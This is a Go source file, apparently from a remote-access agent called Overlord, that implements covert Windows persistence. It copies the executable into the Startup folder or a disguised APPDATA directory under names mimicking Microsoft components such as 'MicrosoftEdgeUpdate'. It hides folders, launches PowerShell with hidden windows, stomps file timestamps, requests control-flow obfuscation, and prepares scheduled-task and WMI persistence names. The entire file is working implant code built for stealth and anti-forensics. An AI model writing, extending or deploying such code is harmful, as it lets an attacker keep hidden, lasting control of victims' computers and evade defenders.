//go:build windows
// +build windows

package persistence

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"

	"overlord-client/cmd/agent/evasion"
)

const (
	registryKey = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

	startupFolderRelative = `Microsoft\Windows\Start Menu\Programs\Startup`

	createNoWindow = 0x08000000
)

// Injectable via -X ldflag at build time. Defaults mimic legitimate Windows components.
var (
	// DefaultExePrefix is the filename prefix for dropped executables.
	DefaultExePrefix = "ms_"
	// DefaultRegistryValue is the base name used for Run registry values.
	DefaultRegistryValue = "MicrosoftEdgeUpdate"
	// DefaultBinaryDir is the APPDATA-relative directory for the dropped binary.
	DefaultBinaryDir = `Microsoft\DeviceSync`
)

func hasCustomName() bool {
	return DefaultStartupName != ""
}

func executablePrefix() string {
	if hasCustomName() {
		return DefaultStartupName
	}
	return DefaultExePrefix
}

func registryValueName() string {
	if hasCustomName() {
		return DefaultStartupName
	}
	return DefaultRegistryValue
}

func registryValueNamePrefix() string {
	return registryValueName() + "-"
}

var hasStartupMethod bool

func getTargetPath() (string, error) {
	if !hasStartupMethod && len(persistInstallFns) > 0 {
		return getAppDataTargetPath()
	}
	return getStartupFolderTargetPath()
}

func installStartupImpl(exePath string) error {
	targetPath, err := getStartupFolderTargetPath()
	if err != nil {
		return err
	}
	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create startup directory: %w", err)
	}
	if strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		return nil
	}
	return replaceExecutable(exePath, targetPath)
}

func getStartupFolderTargetPath() (string, error) {
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return "", fmt.Errorf("APPDATA environment variable not set")
	}
	startupDir := filepath.Join(appDataDir, startupFolderRelative)
	if existing, ok := findExistingBinaryInDir(startupDir); ok {
		return existing, nil
	}
	name, err := generateBinaryName()
	if err != nil {
		return "", err
	}
	return filepath.Join(startupDir, name), nil
}

func getAppDataTargetPath() (string, error) {
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return "", fmt.Errorf("APPDATA environment variable not set")
	}
	dir := filepath.Join(appDataDir, DefaultBinaryDir)
	if existing, ok := findExistingBinaryInDir(dir); ok {
		return existing, nil
	}
	name, err := generateBinaryName()
	if err != nil {
		return "", err
	}
	return filepath.Join(dir, name), nil
}

func getLegacyTargetPath() (string, bool) {
	return "", false
}

func findExistingBinaryInDir(dir string) (string, bool) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", false
	}
	prefix := strings.ToLower(executablePrefix())
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := strings.ToLower(entry.Name())
		if strings.HasSuffix(name, ".exe") && strings.HasPrefix(name, prefix) {
			return filepath.Join(dir, entry.Name()), true
		}
	}
	return "", false
}

func findExistingStartupExecutable(startupDir string) (string, bool) {
	return findExistingBinaryInDir(startupDir)
}

func generateBinaryName() (string, error) {
	if hasCustomName() {
		return DefaultStartupName + ".exe", nil
	}
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("failed to generate executable name: %w", err)
	}
	return DefaultExePrefix + hex.EncodeToString(b) + ".exe", nil
}

func generateStartupExecutableName() (string, error) {
	return generateBinaryName()
}

func deriveTaskName(targetPath string) string {
	prefix := DefaultExePrefix
	if hasCustomName() {
		prefix = DefaultStartupName + "_"
	}
	h := sha256.Sum256([]byte(strings.ToLower(filepath.Clean(targetPath))))
	return prefix + hex.EncodeToString(h[:4])
}

func deriveWMINames(targetPath string) (filterName, consumerName string) {
	prefix := DefaultExePrefix
	if hasCustomName() {
		prefix = DefaultStartupName + "_"
	}
	h := sha256.Sum256([]byte(strings.ToLower(filepath.Clean(targetPath))))
	suffix := hex.EncodeToString(h[:4])
	return prefix + "f" + suffix, prefix + "c" + suffix
}

func tryHideDirectory(dir string) {
	ptr, err := syscall.UTF16PtrFromString(dir)
	if err != nil {
		return
	}
	attrs, err := syscall.GetFileAttributes(ptr)
	if err != nil {
		return
	}
	_ = syscall.SetFileAttributes(ptr, attrs|syscall.FILE_ATTRIBUTE_HIDDEN)
}

func runPowerShell(script string) error {
	cmd := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindow,
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("powershell: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

func install(exePath string) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	if len(persistInstallFns) == 0 {
		if err := installStartupImpl(exePath); err != nil {
			return err
		}
		_ = cleanupLegacyRunValues()
		return nil
	}
	var firstErr error
	for _, fn := range persistInstallFns {
		if err := fn(exePath); err != nil && firstErr == nil {
			firstErr = err
		}
	}
	_ = cleanupLegacyRunValues()
	return firstErr
}

func replaceExecutable(exePath, targetPath string) error {
	srcFile, err := os.Open(exePath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dir := filepath.Dir(targetPath)
	tmpFile, err := os.CreateTemp(dir, "agent-*.tmp")
	if err != nil {
		return fmt.Errorf("failed to create temp executable: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer func() {
		_ = tmpFile.Close()
		_ = os.Remove(tmpPath)
	}()

	if _, err := io.Copy(tmpFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}
	if err := tmpFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync temp file: %w", err)
	}
	if err := tmpFile.Close(); err != nil {
		return fmt.Errorf("failed to close temp file: %w", err)
	}

	if err := os.Rename(tmpPath, targetPath); err != nil {
		if removeErr := os.Remove(targetPath); removeErr == nil {
			if err = os.Rename(tmpPath, targetPath); err == nil {
				evasion.StompTimestamp(targetPath)
				return nil
			}
		}
		return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
	}
	evasion.StompTimestamp(targetPath)
	return nil
}

func configure(exePath string) error {
	return install(exePath)
}

func uninstall() error {
	_ = cleanupLegacyRunValues()

	for _, fn := range persistUninstallFns {
		_ = fn()
	}

	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return nil
	}

	_ = cleanupPrefixedExecutables(filepath.Join(appDataDir, startupFolderRelative))
	_ = cleanupPrefixedExecutables(filepath.Join(appDataDir, DefaultBinaryDir))

	if legacyPath, ok := getLegacyTargetPath(); ok {
		_ = os.Remove(legacyPath)
	}

	return nil
}

func removeCurrentInstall(_ string) error {
	return nil
}

func cleanupPrefixedExecutables(dir string) error {
	entries, err := os.ReadDir(dir)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return fmt.Errorf("failed to read startup cleanup directory %s: %w", dir, err)
	}

	prefix := strings.ToLower(executablePrefix())
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := strings.ToLower(entry.Name())
		if strings.HasPrefix(name, prefix) {
			if err := os.Remove(filepath.Join(dir, entry.Name())); err != nil && !os.IsNotExist(err) {
				return fmt.Errorf("failed to remove startup artifact %s: %w", filepath.Join(dir, entry.Name()), err)
			}
		}
	}

	return nil
}

func cleanupLegacyRunValues() error {
	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		if err == registry.ErrNotExist {
			return nil
		}
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer k.Close()
	return cleanupOverlordRunValues(k)
}

func cleanupOverlordRunValues(k registry.Key) error {
	names, err := k.ReadValueNames(0)
	if err != nil {
		return err
	}
	for _, name := range names {
		if isAgentRunValueName(name) {
			if err := k.DeleteValue(name); err != nil && err != registry.ErrNotExist {
				return err
			}
		}
	}
	return nil
}

func isAgentRunValueName(name string) bool {
	lname := strings.ToLower(name)
	return strings.HasPrefix(lname, strings.ToLower(registryValueNamePrefix())) ||
		strings.EqualFold(name, registryValueName())
}
